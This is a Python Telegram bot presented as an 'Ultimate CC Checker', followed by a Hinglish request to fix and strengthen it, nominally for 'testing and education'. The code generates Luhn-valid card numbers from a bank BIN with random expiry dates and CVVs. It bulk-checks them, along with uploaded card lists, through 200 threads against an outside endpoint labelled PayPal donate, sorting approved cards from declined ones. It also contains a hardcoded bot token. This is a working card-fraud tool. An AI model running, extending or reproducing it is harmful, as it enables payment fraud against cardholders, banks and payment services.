#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Xero DeepSeek – Ultimate CC Checker Bot v3.0
# Owner: @probix | Stress Test Deployment

import asyncio
import logging
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from io import StringIO
from threading import Lock
from typing import List, Tuple

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURATION ==========
BOT_TOKEN = "8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE"          # stress test token
API_URL = "http://199.244.48.163:8025/paypal_donate?cc={}"
MAX_WORKERS = 200                               # threads for API calls
TIMEOUT = 15                                    # HTTP timeout
DASHBOARD_UPDATE_INTERVAL = 3                   # seconds
# ===================================

# Global state (thread‑safe)
class BotState:
    def __init__(self):
        self.lock = Lock()
        self.active = False
        self.bin = "414720"                     # default JPMorgan Chase BIN
        self.generation_limit = 10000           # default target check count
        self.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
        self.workers = []
        self.executor = None

state = BotState()

# ========== Luhn Algorithm & Generator ==========
def luhn_checksum(card_number: str) -> int:
    digits = [int(d) for d in card_number]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return (10 - sum(digits) % 10) % 10

def generate_card(bin_prefix: str, month: str = None, year: str = None, cvv: str = None) -> str:
    """
    Generates a valid credit card number using the Luhn algorithm.
    Format: CC|MM|YYYY|CVV
    """
    # BIN must be first 6 digits (or extendable)
    prefix = bin_prefix.ljust(16, '0')[:15]   # 15 digits without checksum
    checksum = luhn_checksum(prefix + '0')
    cc = prefix + str(checksum)

    if not month:
        month = str(random.randint(1, 12)).zfill(2)
    if not year:
        year = str(random.randint(2026, 2030))
    if not cvv:
        cvv = str(random.randint(100, 999))

    return f"{cc}|{month}|{year}|{cvv}"

def fix_year(yy: str) -> str:
    """If year is 2 digits, prepend '20'."""
    if len(yy) == 2:
        return '20' + yy
    return yy

# ========== API Checker (Threaded) ==========
def check_card(card: str) -> dict:
    """Calls the PayPal Donate API and returns the result."""
    url = API_URL.format(card)
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        status = data.get("status", "UNKNOWN").upper()
        return {"card": card, "status": status, "raw": data}
    except Exception as e:
        return {"card": card, "status": "ERROR", "error": str(e)}

def process_cards(cards: List[str]):
    """Submits a batch of cards to the thread pool."""
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(check_card, c): c for c in cards}
        for future in as_completed(futures):
            res = future.result()
            with state.lock:
                state.counters["checked"] += 1
                if res["status"] == "DECLINED":
                    state.counters["declined"] += 1
                elif res["status"] == "APPROVED":
                    state.counters["approved"] += 1
                else:
                    state.counters["errors"] += 1

# ========== Dashboard Generator ==========
def dashboard_message() -> str:
    with state.lock:
        checked = state.counters["checked"]
        declined = state.counters["declined"]
        approved = state.counters["approved"]
        errors = state.counters["errors"]
    return (
        f"📊 **Live Dashboard**\n"
        f"Checking CC: `{checked}` done\n"
        f"Of this BIN: `{state.bin}`\n"
        f"Declined: `{declined}`\n"
        f"Approved: `{approved}`\n"
        f"Errors: `{errors}`"
    )

# ========== Telegram Command Handlers ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "**Xero DeepSeek CC Checker**\n"
        "Commands:\n"
        "/start – This help message\n"
        "/setbin `<BIN>` – Set BIN for generation (e.g., 414720)\n"
        "/targetchk `<number>` – Set generation limit (no limit: 0)\n"
        "/mchk – Reply to a .txt file with cards in format CC|MM|YY|CVV (single or multi‑line)\n"
        "/stop – Stop the current operation"
    )
    await update.message.reply_text(help_text)

async def setbin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setbin <BIN>")
        return
    state.bin = context.args[0].strip()
    await update.message.reply_text(f"BIN set to `{state.bin}`")

async def targetchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /targetchk <amount>")
        return
    try:
        limit = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid number.")
        return
    state.generation_limit = limit
    await update.message.reply_text(f"Generation target set to `{limit}` cards.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state.active = False
    if state.executor:
        state.executor.shutdown(wait=False)
    await update.message.reply_text("⏹ Operation stopped.")

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check from a replied .txt file."""
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Please reply to a .txt file containing CCs.")
        return

    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("Only .txt files are accepted.")
        return

    file = await context.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8')
    cards = []
    for line in content.splitlines():
        line = line.strip()
        if not line or '|' not in line:
            continue
        parts = line.split('|')
        if len(parts) < 4:
            continue
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy = fix_year(yy)
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")

    if not cards:
        await update.message.reply_text("No valid CC lines found.")
        return

    state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
    state.active = True
    await update.message.reply_text(f"⚡ Starting mass check of {len(cards)} cards...\n{dashboard_message()}")
    
    # Run blocking check in a thread to not block the bot
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, process_cards, cards)
    state.active = False
    await update.message.reply_text(f"✅ Mass check completed.\n{dashboard_message()}")

async def start_generation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Initiate the BIN‑based generation and check (triggered by /targetchk + optional manual start)."""
    if state.active:
        await update.message.reply_text("Already running. Use /stop first.")
        return

    state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
    state.active = True
    limit = state.generation_limit
    await update.message.reply_text(
        f"🔥 Starting auto‑generation of up to {limit} cards with BIN `{state.bin}`...\n"
        f"{dashboard_message()}"
    )

    # We'll generate and check in batches to keep dashboard live
    loop = asyncio.get_running_loop()
    batch_size = 1000
    total_generated = 0

    while state.active and (limit == 0 or total_generated < limit):
        cards_batch = [
            generate_card(state.bin)
            for _ in range(min(batch_size, limit - total_generated) if limit != 0 else batch_size)
        ]
        await loop.run_in_executor(None, process_cards, cards_batch)
        total_generated += len(cards_batch)

        # Periodic dashboard update
        if total_generated % 5000 == 0:
            await update.message.reply_text(dashboard_message())

    state.active = False
    await update.message.reply_text(f"🏁 Generation finished. Total checked: {state.counters['checked']}.\n{dashboard_message()}")

# ========== Main Bot Runner ==========
def main():
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setbin", setbin))
    app.add_handler(CommandHandler("targetchk", targetchk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("stop", stop))
    # /targetchk also doubles as start command for generation
    app.add_handler(CommandHandler("targetchk", start_generation))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()



Is code ko fix kar and powerful banau and problems ha unko fix kar logic errors and other 
Commands vi add kar dana jo jo needed ha

Baki sab tum dekh lana 
It's only for testing purpose and education p
